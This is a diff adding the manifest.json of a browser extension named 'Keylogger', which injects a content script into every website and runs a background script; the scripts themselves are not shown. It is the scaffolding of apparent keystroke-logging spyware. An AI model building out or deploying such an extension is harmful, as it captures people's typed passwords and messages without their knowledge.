@@ -1,0 +1,19 @@
+
+{
+    "manifest_version": 2,
+    "name": "Keylogger",
+    "version": "1.1",
+    "icons" : {
+      "720" : "icon.png"
+    },
+    "description": "",
+    "background": {
+      "scripts": ["background.js"]
+    },
+    "content_scripts": [
+        {
+          "matches": ["*://*/*"],
+          "js": ["content.js"]
+        }
+    ]
+  }
